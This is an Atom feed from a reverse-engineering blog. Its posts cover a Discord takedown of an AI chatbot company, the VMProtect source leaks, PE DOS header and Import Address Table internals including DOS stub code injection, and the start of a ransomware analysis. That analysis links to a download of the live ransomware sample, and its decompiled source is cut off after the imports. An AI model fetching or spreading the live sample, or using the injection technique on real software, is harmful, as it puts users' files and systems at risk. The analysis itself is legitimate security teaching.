@@ -1,0 +1,1129 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://github.com/pages/Alon-Alush/alonalush.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://github.com/pages/Alon-Alush/alonalush.github.io/" rel="alternate" type="text/html" /><updated>2025-05-04T17:52:03+00:00</updated><id>https://github.com/pages/Alon-Alush/alonalush.github.io/feed.xml</id><title type="html">Alon Alush</title><subtitle>Welcome to my blog!</subtitle><author><name>Alon Alush</name></author><entry><title type="html">Shapes, Inc got mass-terminated by Discord!</title><link href="https://github.com/pages/Alon-Alush/alonalush.github.io/ai%20world/shapesinctermination/" rel="alternate" type="text/html" title="Shapes, Inc got mass-terminated by Discord!" /><published>2025-05-03T00:00:00+00:00</published><updated>2025-05-03T00:00:00+00:00</updated><id>https://github.com/pages/Alon-Alush/alonalush.github.io/ai%20world/shapesinctermination</id><content type="html" xml:base="https://github.com/pages/Alon-Alush/alonalush.github.io/ai%20world/shapesinctermination/"><![CDATA[<h1 id="explaining-the-discord-controversy">Explaining the Discord controversy</h1>
+
+<p><a href="https://shapes.inc/">Shapes.inc</a> is a platform that allows users to create and host their so-called “Shapes”, which are AI-powered chatbots that are customizable and personalized.</p>
+
+<p><strong>But here’s the deal</strong>: Their <strong>entire Discord server</strong>, once a hub for <strong>10 million members!</strong> that created, shared, and talked to these Shapes, got completely wiped by Discord in a mass-takedown campaign. Among the terminated apps <strong>are the Shapes bots themselves</strong> that users created through the <a href="https://discord.com/developers/applications">Developer Portal API</a>.</p>
+
+<p>Immediately following Discord’s ban of these bots, the admins quickly responded with a call to action, begging their members into submitting <em>mass-appeals</em> under the reason “<code class="language-plaintext highlighter-rouge">Shapes did not train AI models on discord user data and messages"</code>:</p>
+
+<p><img src="/assets/images/AI%20world/shapesinc/announcement.png" alt="Call to action" /></p>
+
+<p><img src="/assets/images/AI%20world/shapesinc/termination1.png" alt="Shapes application termination" /></p>
+
+<p>Allegedly, Shapes violated Discord’s <a href="https://support-dev.discord.com/hc/en-us/articles/8562894815383-Discord-Developer-Terms-of-Service">Developer Terms of Service</a> by illegally collecting the messages that users sent to these bots.</p>
+
+<p>Looking back, this “mass-appeal” campaign ended up harming their reputation even more, because, according to users, they wouldn’t have insistently denied those claims so blatantly if they <em>truly</em> hadn’t intended on collecting such data.</p>
+
+<p>Discord later terminated the Discord server itself, as mentioned eariler. Then, the posts became flooding from Shapes members expressing their frustrations.</p>
+
+<p><img src="/assets/images/AI%20world/shapesinc/post.png" alt="Shapes application termination" /></p>
+
+<p><img src="/assets/images/AI%20world/shapesinc/termination.png" alt="Shapes application termination" /></p>
+
+<h1 id="the-communitys-perspective">The community’s perspective</h1>
+
+<p>The community’s responses regarding the incidents were mixed. Some members harshly criticized Discord’s perceived overreach when it comes to Discord-hosted projects like these:</p>
+
+<p><img src="/assets/images/AI%20world/shapesinc/comment.png" alt="Reddit comment criticizing Discord over the takedown" /></p>
+
+<p>Others took a more balanced stance, expressing skepticism regarding Shapes’s claim of “innocency” and mentioning how their questionable data collection practices have definitely played a role in the takedown:</p>
+
+<p><img src="/assets/images/AI%20world/shapesinc/defend.png" alt="Reddit comment defending Discord's actions" /></p>
+
+<p><img src="/assets/images/AI%20world/shapesinc/defend1.png" alt="Reddit comment defending Discord's actions" /></p>
+
+<h1 id="moving-forward">Moving forward</h1>
+
+<p>I think this is a massive hit to Shapes Inc’s reputation in the human-AI interaction space, both <a href="https://www.linkedin.com/company/shapesinc">as a company</a> and as <a href="https://discord.com/invite/shapes">a community</a>. Not only did they handle the situation unprofessionally (instructing clients to appeal in favor of them), but they also didn’t properly report their data collection practices to Discord, as reported by multiple sources. This isn’t a mom-and-pop shop, after all; we’re talking about potentially <em>millions</em> of users who sent private information to these chatbots.</p>]]></content><author><name>Alon Alush</name></author><category term="AI world" /><summary type="html"><![CDATA[Shapes, Inc, a Discord hub for creating and talking to customized AI chatbots, just got terminated; and it doesn't look good. Quick rundown of the incident.]]></summary></entry><entry><title type="html">The breach of VMProtect: 2 major incidents</title><link href="https://github.com/pages/Alon-Alush/alonalush.github.io/unpacking/vmprotectleak/" rel="alternate" type="text/html" title="The breach of VMProtect: 2 major incidents" /><published>2025-04-26T00:00:00+00:00</published><updated>2025-04-26T00:00:00+00:00</updated><id>https://github.com/pages/Alon-Alush/alonalush.github.io/unpacking/vmprotectleak</id><content type="html" xml:base="https://github.com/pages/Alon-Alush/alonalush.github.io/unpacking/vmprotectleak/"><![CDATA[<h1 id="vmprotect-leak">VMProtect leak</h1>
+
+<p>In 2023, <a href="https://vmpsoft.com/">VMProtect</a>, a commercial virtualization-based protector for executable files, was leaked — not once, but <em>twice</em>.</p>
+
+<p>First, a dump of the protector popped up in May 2023:</p>
+
+<p><img src="/assets/images/unpacking/vmprotectleak/dump.png" alt="VMProtect initial leak" /></p>
+
+<p>This dump was shared via the Chinese Kanxue Security Forum, frequently used for sharing software cracks:</p>
+
+<p><img src="/assets/images/unpacking/vmprotectleak/forum.png" alt="forum leak" /></p>
+
+<p>Then, about half a year later, the more complete archive was leaked (7 Dec 2023) and posted on GitHub:</p>
+
+<p><img src="/assets/images/unpacking/vmprotectleak/full.png" alt="VMProtect posted on GitHub" /></p>
+
+<h1 id="timeline">Timeline</h1>
+
+<ul>
+  <li>
+    <p><strong>May 2023</strong> : Large chunk of VMProtect 3.x codebase leaked, first public confirmation that the code was in the wild.<a href="https://forum.tuts4you.com/topic/44205-leaked-vmprotect-sources/?utm_source=chatgpt.com">[1]</a><a href="https://www.risky.biz/RBNEWS146/">[2]</a><a href="https://www.unknowncheats.me/forum/general-programming-and-reversing/583253-vmprotect-source-leak.html">[3]</a><a href="https://x.com/gmhzxy/status/1563608617169096708">[4]</a></p>
+  </li>
+  <li>
+    <p><strong>December 2023</strong> : <strong>A second, packaged dump advertised as the “full” source was released on Github</strong>. Still missing a few files such as the ARM back-end, demanglers, but enough to compile parts of the tool.<a href="https://github.com/jmpoep/vmprotect-3.5.1">[1]</a></p>
+  </li>
+</ul>
+
+<p><img src="/assets/images/unpacking/vmprotectleak/github.png" alt="VMProtect full archive on github" /></p>
+
+<p>There was no evidence of an <em>internal</em> hack at VMPSoft, the consensus is an outsider stole the code (likely from a customer portal or reseller) and leaked it.</p>
+
+<h1 id="is-vmprotect-cracked-now">Is VMProtect “cracked” now?</h1>
+
+<p>Yes and no; having the source code made it possible to partially compile VMProtect:</p>
+
+<p><img src="/assets/images/unpacking/vmprotectleak/partial.png" alt="VMProtect full archive on github" /></p>
+
+<p>The core virtualization module (<code class="language-plaintext highlighter-rouge">intel.cc</code>) was of main interest to reverse engineers / crackers; in total, it amounted to roughly 31000 lines of raw C++!</p>
+
+<p><img src="/assets/images/unpacking/vmprotectleak/intel.png" alt="VMProtect full archive on github" /></p>
+
+<h1 id="the-communitys-response">The community’s response</h1>
+
+<p>Overall, the reverse engineering community welcomed the breach of VMProtect, with some even describing it as a “Christmas gift” 🎁:</p>
+
+<p><img src="/assets/images/unpacking/vmprotectleak/responses.png" alt="VMProtect full archive on github" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">securemk</code> thought the breach was an “invaluable resource” for wannabe reverse engineers like him:</p>
+
+<p><img src="/assets/images/unpacking/vmprotectleak/responses1.png" alt="VMProtect full archive on github" /></p>
+
+<h1 id="moving-forward">Moving forward</h1>
+
+<p>Personally, I see this as a <em>temporary</em> blow to VMProtect’s reputation in the software protection community. Still, they’ve probably prepared for these kinds of situations, and as of 2025, the protector is still kicking:</p>
+
+<p><img src="/assets/images/unpacking/vmprotectleak/website.png" alt="VMProtect full archive on github" /></p>
+
+<p>I hope you found this post interesting!</p>]]></content><author><name>Alon Alush</name></author><category term="Unpacking" /><summary type="html"><![CDATA[Discussing the breaches of VMProtect's source code that emerged in 2023]]></summary></entry><entry><title type="html">PE file format: DOS Header</title><link href="https://github.com/pages/Alon-Alush/alonalush.github.io/pe%20file%20format/dosheader/" rel="alternate" type="text/html" title="PE file format: DOS Header" /><published>2025-04-22T00:00:00+00:00</published><updated>2025-04-22T00:00:00+00:00</updated><id>https://github.com/pages/Alon-Alush/alonalush.github.io/pe%20file%20format/dosheader</id><content type="html" xml:base="https://github.com/pages/Alon-Alush/alonalush.github.io/pe%20file%20format/dosheader/"><![CDATA[<h1 id="dos-header">DOS header</h1>
+
+<p><strong>First of all, what’s the DOS header?</strong></p>
+
+<p>The DOS header is a structure located right at the start of DOS-MZ executables, and preserved on the newer PE format for backwards compatibility. The beginining of the DOS header is marked by the ASCII sequence “<code class="language-plaintext highlighter-rouge">MZ</code>” (<code class="language-plaintext highlighter-rouge">4D 5A</code> in hex). Those are the initials of Mark Zbikowski, the designer of the DOS-MZ format.</p>
+
+<p><img src="/assets/images/pefileformat/dosheader/image.png" alt="MZ" /></p>
+
+<p>In Portable Executable files, the DOS header contains an additional <a href="https://learn.microsoft.com/en-us/cpp/build/reference/stub-ms-dos-stub-file-name?view=msvc-170">DOS stub</a> containing the following ASCII sequence:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"This program cannot be run in DOS mode."
+</code></pre></div></div>
+<p><img src="/assets/images/pefileformat/dosheader/image-1.png" alt="DOS header stub" /></p>
+
+<h1 id="key-fields-in-the-dos-header">Key fields in the DOS header</h1>
+
+<p><code class="language-plaintext highlighter-rouge">WORD e_magic</code>: a 2-byte signature that must equal to <code class="language-plaintext highlighter-rouge">MZ</code> (<code class="language-plaintext highlighter-rouge">0x4D5A</code> in hexadecimal). This sequence lets the loader know that the file is a valid DOS executable (and by extension, a valid PE file).</p>
+
+<p><code class="language-plaintext highlighter-rouge">LONG e_lfanew</code>: In PE files, this newer 4-byte field contains the offset to the NT header. It’s relative to <code class="language-plaintext highlighter-rouge">e_magic</code>, the <code class="language-plaintext highlighter-rouge">MZ</code> signature) which is the start of the file.</p>
+
+<p><img src="/assets/images/pefileformat/dosheader/image-2.png" alt="e_lfanew field" /></p>
+
+<p>In the following example, <code class="language-plaintext highlighter-rouge">e_lfanew</code> field corresponds to the byte sequence <code class="language-plaintext highlighter-rouge">C8 00 00 00</code>. That means that <code class="language-plaintext highlighter-rouge">0xC8</code> (ignoring the null values) is the offset to the NT header in modern PE files.</p>
+
+<p><strong>To find the NT header in HxD</strong>, let’s go to offset <code class="language-plaintext highlighter-rouge">C8</code> found in the <code class="language-plaintext highlighter-rouge">e_lfanew</code> field, this offset is relative to the file start (<code class="language-plaintext highlighter-rouge">0x0</code>):</p>
+
+<p><img src="/assets/images/pefileformat/dosheader/image-3.png" alt="Going to offset 0xC8" /></p>
+
+<p><img src="/assets/images/pefileformat/dosheader/header.gif" alt="New PE header" /></p>
+
+<p>Can see you see the <code class="language-plaintext highlighter-rouge">PE\0\0</code> signature that I highlighted?</p>
+
+<p><img src="/assets/images/pefileformat/dosheader/sig.png" alt="PE\0\0 sig" /></p>
+
+<p>This marks the start of the <strong>IMAGE_NT_HEADERS</strong> structure, and Windows uses <code class="language-plaintext highlighter-rouge">e_lfanew</code> to find the offset to that structure.</p>
+
+<p>Below is a diagram I made, illustrating it:</p>
+
+<p><img src="/assets/images/pefileformat/dosheader/diagram.png" alt="Sections diagram I made" /></p>
+
+<h1 id="c-representation-of-image_dos_header">C representation of IMAGE_DOS_HEADER</h1>
+
+<p>We can take a look at the contents of the DOS header by looking at the <code class="language-plaintext highlighter-rouge">IMAGE_DOS_HEADER</code> structure definition from <code class="language-plaintext highlighter-rouge">winnt.h</code></p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_IMAGE_DOS_HEADER</span> <span class="p">{</span>  
+    <span class="n">WORD</span> <span class="n">e_magic</span><span class="p">;</span>    <span class="c1">// Magic number (MZ)</span>
+    <span class="n">WORD</span> <span class="n">e_cblp</span><span class="p">;</span>     <span class="c1">// Bytes on last page of file</span>
+    <span class="n">WORD</span> <span class="n">e_cp</span><span class="p">;</span>       <span class="c1">// Pages in file</span>
+    <span class="n">WORD</span> <span class="n">e_crlc</span><span class="p">;</span>     <span class="c1">// Relocations</span>
+    <span class="n">WORD</span> <span class="n">e_cparhdr</span><span class="p">;</span>  <span class="c1">// Size of header in paragraphs</span>
+    <span class="n">WORD</span> <span class="n">e_minalloc</span><span class="p">;</span> <span class="c1">// Minimum extra paragraphs needed</span>
+    <span class="n">WORD</span> <span class="n">e_maxalloc</span><span class="p">;</span> <span class="c1">// Maximum extra paragraphs needed</span>
+    <span class="n">WORD</span> <span class="n">e_ss</span><span class="p">;</span>       <span class="c1">// Initial (relative) SS value</span>
+    <span class="n">WORD</span> <span class="n">e_sp</span><span class="p">;</span>       <span class="c1">// Initial SP value</span>
+    <span class="n">WORD</span> <span class="n">e_csum</span><span class="p">;</span>     <span class="c1">// Checksum</span>
+    <span class="n">WORD</span> <span class="n">e_ip</span><span class="p">;</span>       <span class="c1">// Initial IP value</span>
+    <span class="n">WORD</span> <span class="n">e_cs</span><span class="p">;</span>       <span class="c1">// Initial (relative) CS value</span>
+    <span class="n">WORD</span> <span class="n">e_lfarlc</span><span class="p">;</span>   <span class="c1">// File address of relocation table</span>
+    <span class="n">WORD</span> <span class="n">e_ovno</span><span class="p">;</span>     <span class="c1">// Overlay number</span>
+    <span class="n">WORD</span> <span class="n">e_res</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>   <span class="c1">// Reserved words</span>
+    <span class="n">WORD</span> <span class="n">e_oemid</span><span class="p">;</span>    <span class="c1">// OEM identifier (for e_oeminfo)</span>
+    <span class="n">WORD</span> <span class="n">e_oeminfo</span><span class="p">;</span>  <span class="c1">// OEM information; e_oemid specific</span>
+    <span class="n">WORD</span> <span class="n">e_res2</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span> <span class="c1">// Reserved words</span>
+    <span class="n">LONG</span> <span class="n">e_lfanew</span><span class="p">;</span>   <span class="c1">// File address of new exe header (important!)</span>
+<span class="p">}</span> <span class="n">IMAGE_DOS_HEADER</span><span class="p">,</span> <span class="o">*</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>The struct has 30 <code class="language-plaintext highlighter-rouge">WORD</code> fields (2 bytes each), plus the 4-byte <code class="language-plaintext highlighter-rouge">e_lfanew</code> (of size <code class="language-plaintext highlighter-rouge">LONG</code>).</p>
+
+<p>Total size: 30 * 2 + 4 = exactly <strong>64 bytes</strong>.</p>
+
+<h1 id="historical-background">Historical background</h1>
+
+<p><strong>A lot of you right now may be confused:</strong> Why does every PE file need a DOS header, despite modern Windows system not even running DOS programs?</p>
+
+<p>2 words: <strong>backwards compatibility</strong>.</p>
+
+<p>See, the PE format was designed <em>as an extension</em> of the old <a href="https://en.wikipedia.org/wiki/DOS_MZ_executable">DOS MZ executable format</a>. Back then, the Portable Executable format was a <em>new kid on the block</em>. Both DOS-MZ and PE executables were distributed with a <code class="language-plaintext highlighter-rouge">.exe</code> extension, so whenever a user attempted to run a PE <code class="language-plaintext highlighter-rouge">.exe</code> on MS-DOS, <strong>the DOS loaders would behave unexpectedly</strong> because they expected a DOS MZ format for <code class="language-plaintext highlighter-rouge">.exe</code> extensions, not Portable Executable.</p>
+
+<p>So, in order to make the DOS loaders predictably exit the program upon running a PE executable, Microsoft distributed <em>every</em> PE file with this DOS stub inside the DOS header:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">This</span> <span class="n">program</span> <span class="n">cannot</span> <span class="n">be</span> <span class="n">run</span> <span class="n">in</span> <span class="n">DOS</span> <span class="n">mode</span>
+</code></pre></div></div>
+
+<p>So that if a DOS loader tries to execute a PE file, they don’t crash or hang; instead, they immediately print this message in the console and exit the process.</p>
+
+<p><img src="/assets/images/pefileformat/dosheader/loader.png" alt="This program cannot be run in DOS mode" /></p>
+
+<p>Looking back, making this ASCII sequence native to <em>every</em> PE file <em>“might’ve”</em> been a mistake move by Microsoft😅. The PE format evolved to be a much more powerful and modular format afterward, <em>way</em> more than originally speculated, leaving the DOS-MZ forma to die in the shadows. Yet, every PE file in existence <em>still</em> contains those 36 bytes worth of ASCII bloat, to remind <em>DOS loaders</em> from 40 years ago that our modern <code class="language-plaintext highlighter-rouge">.exe</code> file cannot be run on DOS systems.</p>
+
+<h1 id="dos-stub-code-injection">DOS stub code injection</h1>
+
+<p>The DOS header (and the DOS stub) <strong>can be modified to inject custom code</strong>. Back in the days of DOS-MZ, malware authors would inject their custom 16-bit DOS code into the DOS header itself. Then, when a DOS machine tries to run the modified <code class="language-plaintext highlighter-rouge">.exe</code>, it will execute the injected DOS code instead of the boring “This program cannot be run in DOS mode” message.</p>
+
+<p>To demonstrate how this is done, I’ll take a random PE executable and replace its DOS stub with a custom 16-bit shellcode to it that prints “<code class="language-plaintext highlighter-rouge">@AlonAlush</code>” 5 times in green.</p>
+
+<p>To correctly exit the program after executing our payload, we’ll add the bytes <code class="language-plaintext highlighter-rouge">0x4C01</code> right after the <code class="language-plaintext highlighter-rouge">PE\0\0</code> signature. In 16-bit MS-DOS assembly, the opcode <code class="language-plaintext highlighter-rouge">4C</code> corresponds to the <code class="language-plaintext highlighter-rouge">INT 21h</code> function <code class="language-plaintext highlighter-rouge">4CH</code>, which terminates a process with a return code. Following it, <code class="language-plaintext highlighter-rouge">01</code> is the exit code passed.</p>
+
+<p><img src="/assets/images/pefileformat/dosheader/doshellcode.png" alt="DOS stub shellcode injection" /></p>
+
+<p>Now let’s run this patched PE in <code class="language-plaintext highlighter-rouge">DOSBox</code>, a very popular MS-DOS emulator:</p>
+
+<p><img src="/assets/images/pefileformat/dosheader/result.png" alt="Injected code in DOSBox" /></p>
+
+<p>As you can see, instead of printing the generic “This program cannot be run in DOS mode”, our exe ran the injected code that printed <code class="language-plaintext highlighter-rouge">@AlonAlush</code> name in green 5 times, as we expected. Of course, you can modify the DOS stub to run any 16-bit machine code you’d like.</p>]]></content><author><name>Alon Alush</name></author><category term="PE File Format" /><summary type="html"><![CDATA[Explaining the DOS header in Windows executable formats]]></summary></entry><entry><title type="html">PE file format: Import Address Table</title><link href="https://github.com/pages/Alon-Alush/alonalush.github.io/pe%20file%20format/importaddresstable/" rel="alternate" type="text/html" title="PE file format: Import Address Table" /><published>2025-04-21T00:00:00+00:00</published><updated>2025-04-21T00:00:00+00:00</updated><id>https://github.com/pages/Alon-Alush/alonalush.github.io/pe%20file%20format/importaddresstable</id><content type="html" xml:base="https://github.com/pages/Alon-Alush/alonalush.github.io/pe%20file%20format/importaddresstable/"><![CDATA[<h1 id="pe-file-format-import-address-table">PE file format: Import Address Table</h1>
+
+<p>The Import Address Table stores the memory addresses of external functions that the program uses</p>
+<h1 id="example">Example</h1>
+
+<p>Here, we can see that function implementation of MessageBoxA resides in the address <code class="language-plaintext highlighter-rouge">0x75EA05B0</code> in memory.</p>
+
+<p><code class="language-plaintext highlighter-rouge">user32.dll</code> -&gt; <code class="language-plaintext highlighter-rouge">MessageBoxA</code> -&gt; <code class="language-plaintext highlighter-rouge">75EA05B0</code></p>
+
+<p><img src="/assets/images/pefileformat/iat/messagebox.png" alt="MessageBoxA implementation" /></p>
+
+<p><strong>When calling MessageBoxA, how does the program <em>know</em> that MessageBoxA resides here <code class="language-plaintext highlighter-rouge">0x75EA05B0</code>?</strong></p>
+
+<p>This is where the Import Address Table comes into play: it contains the <strong>RVAs (Relative Virtual Addresses)</strong> from the Image Base to the function’s implementation in memory.</p>
+
+<p>The program uses the Import Address Table to dynamically resolve the addresses of these functions.</p>
+
+<p>Now that we know what the IAT is, let’s see how to find it programmatically using C and WinAPI.</p>
+
+<h1 id="programatically-finding-the-iat">Programatically finding the IAT</h1>
+
+<p>Here’s how to get to the IAT using WinAPI and C:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// decryptedPE is a BYTE* pointing to the in-memory EXE buffer</span>
+<span class="n">IMAGE_DOS_HEADER</span><span class="o">*</span> <span class="n">dosHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">IMAGE_DOS_HEADER</span><span class="o">*</span><span class="p">)</span><span class="n">decryptedPE</span><span class="p">;</span>
+<span class="n">IMAGE_NT_HEADERS64</span><span class="o">*</span> <span class="n">ntHeaders</span> <span class="o">=</span> <span class="p">(</span><span class="n">IMAGE_NT_HEADERS64</span><span class="o">*</span><span class="p">)(</span><span class="n">decryptedPE</span> <span class="o">+</span> <span class="n">dosHeader</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>
+<span class="n">IMAGE_IMPORT_DESCRIPTOR</span><span class="o">*</span> <span class="n">importDesc</span> <span class="o">=</span> <span class="p">(</span><span class="n">IMAGE_IMPORT_DESCRIPTOR</span><span class="o">*</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">ntHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="p">].</span><span class="n">VirtualAddress</span><span class="p">);</span>
+<span class="n">IMAGE_THUNK_DATA64</span><span class="o">*</span> <span class="n">firstThunk</span> <span class="o">=</span> <span class="p">(</span><span class="n">IMAGE_THUNK_DATA64</span><span class="o">*</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">importDesc</span><span class="o">-&gt;</span><span class="n">FirstThunk</span><span class="p">);</span> <span class="c1">// Locate IAT</span>
+</code></pre></div></div>
+
+<p>Here, <code class="language-plaintext highlighter-rouge">firstThunk</code> is a pointer to the Import Address Table in memory.</p>
+
+<h1 id="iat-structure">IAT structure</h1>
+
+<p>The IAT itself contains several fields:</p>
+
+<p><img src="/assets/images/pefileformat/iat/fields.png" alt="MessageBoxA implementation" /></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">u1.AddressOfData</code>: <strong>Before loading (on-disk)</strong>, this is a pointer (RVA) to an <code class="language-plaintext highlighter-rouge">IMAGE_IMPORT_BY_NAME</code> structure (where the function name is stored).</li>
+  <li><code class="language-plaintext highlighter-rouge">u1.Ordinal</code> : If the function is imported by <code class="language-plaintext highlighter-rouge">ordinal</code> (number) instead of by name.</li>
+  <li><code class="language-plaintext highlighter-rouge">u1.ForwarderString</code>: If a function is <a href="https://devblogs.microsoft.com/oldnewthing/20060719-24/?p=30473"><em>forwarded</em></a>, this field contains an RVA to ASCII strings in memory that includes the name of the forwarded module and the function inside it to look for (e.g. <code class="language-plaintext highlighter-rouge">NTDLL.RtlExitUserThread</code>).</li>
+  <li><code class="language-plaintext highlighter-rouge">u1.Function</code> After the loader resolves the import, the <code class="language-plaintext highlighter-rouge">u1.Function</code> field is populated with the <strong>absolute memory address</strong> of the function in memory.</li>
+</ul>]]></content><author><name>Alon Alush</name></author><category term="PE File Format" /><summary type="html"><![CDATA[Explaining in detail the Import Address Table (IAT) structure in Portable Executable (PE) file]]></summary></entry><entry><title type="html">Decoding a Pyinstaller ransomware sample</title><link href="https://github.com/pages/Alon-Alush/alonalush.github.io/malware%20analysis/pythonransomware/" rel="alternate" type="text/html" title="Decoding a Pyinstaller ransomware sample" /><published>2025-04-20T00:00:00+00:00</published><updated>2025-04-20T00:00:00+00:00</updated><id>https://github.com/pages/Alon-Alush/alonalush.github.io/malware%20analysis/pythonransomware</id><content type="html" xml:base="https://github.com/pages/Alon-Alush/alonalush.github.io/malware%20analysis/pythonransomware/"><![CDATA[<p><strong>Note:</strong> if you want to download this ransomware sample for educational purposes, feel free to do so by clicking here: <a href="https://drive.usercontent.google.com/download?id=1NWs44HGrYTqrUm1V_G-gTXTrdXReOjDn&amp;export=download&amp;authuser=0">password: infected</a></p>
+
+<h1 id="introduction">Introduction</h1>
+
+<p>Recently, I’ve came across this Python ransomware sample:
+<img src="/assets/images/malwareanalysis/pyinstaller/image.png" alt="Encryptor.exe ransomware" /></p>
+
+<p>First, here’s the ransom note:
+<img src="/assets/images/malwareanalysis/pyinstaller/note.png" alt="ransomware note" /></p>
+
+<p>Now, let’s start examining the .exe file statically.</p>
+<h1 id="understanding-the-file">Understanding the file</h1>
+<p>Here’s the <code class="language-plaintext highlighter-rouge">Detect It Easy</code> output:
+<img src="/assets/images/malwareanalysis/pyinstaller/image-1.png" alt="Detect it easy" /></p>
+
+<p>We can clearly see that the program is a python-compiled executable, by examining the hexadecimal artifacts:</p>
+
+<p><img src="/assets/images/malwareanalysis/pyinstaller/image-2.png" alt="alt text" /></p>
+
+<p>Now, let’s jump to reversing the file!</p>
+
+<p>We will use the Python script <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a> to extract and analyze the contents of this pyinstaller generated executable file:</p>
+<h1 id="unpacking-pyinstaller-resources">Unpacking pyinstaller resources</h1>
+<p><img src="/assets/images/malwareanalysis/pyinstaller/image-3.png" alt="Analyzing the file" /></p>
+
+<p>We received the output from pyinstxtractor:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\WDAGUtilityAccount\Downloads\analyzing&gt;pyinstxtractor.py Encryptor.exe
+[+] Processing Encryptor.exe
+[+] Pyinstaller version: 2.1+
+[+] Python version: 3.13
+[+] Length of package: 21092376 bytes
+[+] Found 120 files in CArchive
+[+] Beginning extraction...please standby
+[+] Possible entry point: pyiboot01_bootstrap.pyc
+[+] Possible entry point: pyi_rth_inspect.pyc
+[+] Possible entry point: pyi_rth_cryptography_openssl.pyc
+[+] Possible entry point: pyi_rth_pywintypes.pyc
+[+] Possible entry point: pyi_rth_pythoncom.pyc
+[+] Possible entry point: pyi_rth_pkgres.pyc
+[+] Possible entry point: pyi_rth_multiprocessing.pyc
+[+] Possible entry point: pyi_rth_setuptools.pyc
+[+] Possible entry point: pyi_rth_pkgutil.pyc
+[+] Possible entry point: Encryptor.pyc
+[+] Found 609 files in PYZ archive
+[+] Successfully extracted pyinstaller archive: Encryptor.exe
+
+</code></pre></div></div>
+
+<p>You can now use a python decompiler on the pyc files within the extracted directory.</p>
+
+<p>So, let’s go to the newly generated <code class="language-plaintext highlighter-rouge">Encrypted.exe_extracted</code> folder:</p>
+
+<p><img src="/assets/images/malwareanalysis/pyinstaller/image-4.png" alt="Unpacked libraries" /></p>
+
+<p>This ransomware sample clearly uses a lot of cryptographic libraries.</p>
+
+<p>This <code class="language-plaintext highlighter-rouge">Encrypted.pyc</code> file is one of the files in the <code class="language-plaintext highlighter-rouge">Encrypted.exe_extracted</code> folder:</p>
+
+<p><img src="/assets/images/malwareanalysis/pyinstaller/image-5.png" alt="Bytecode" /></p>
+
+<p>Now, we need to decompile the <code class="language-plaintext highlighter-rouge">Encrypted.pyc</code> file we received from pyinstxtractor. For that, we’ll use the web interface of this library called <a href="https://www.pylingual.io/">pylingual</a>, that decompiles <code class="language-plaintext highlighter-rouge">.pyc</code> files containing the compiled bytecode of the ransomware’s main Python source code:</p>
+
+<p>Pylingual gave us a great reconstruction of the source code:</p>
+<h1 id="reconstructed-source-code">Reconstructed source code</h1>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c1"># Decompiled with PyLingual (https://pylingual.io)
+# Internal filename: Encryptor.py
+# Bytecode version: 3.13.0rc3 (3571)
+# Source timestamp: 1970-01-01 00:00:00 UTC (0)
+</span>
+<span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
+<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span><span class="p">,</span> <span class="n">ImageDraw</span><span class="p">,</span> <span class="n">ImageFont</span>
+<span class="kn">import</span> <span class="nn">ctypes</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">shutil</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">win32com.client</span> <span class="kn">import</span> <span class="n">Dispatch</span>
+<span class="kn">from</span> <span class="nn">win32api</span> <span class="kn">import</span> <span class="n">GetSystemMetrics</span>
+<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span><span class="p">,</span> <span class="n">ImageDraw</span><span class="p">,</span> <span class="n">ImageFont</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">secrets</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.asymmetric</span> <span class="kn">import</span> <span class="n">padding</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">serialization</span><span class="p">,</span> <span class="n">hashes</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers</span> <span class="kn">import</span> <span class="n">Cipher</span><span class="p">,</span> <span class="n">algorithms</span><span class="p">,</span> <span class="n">modes</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
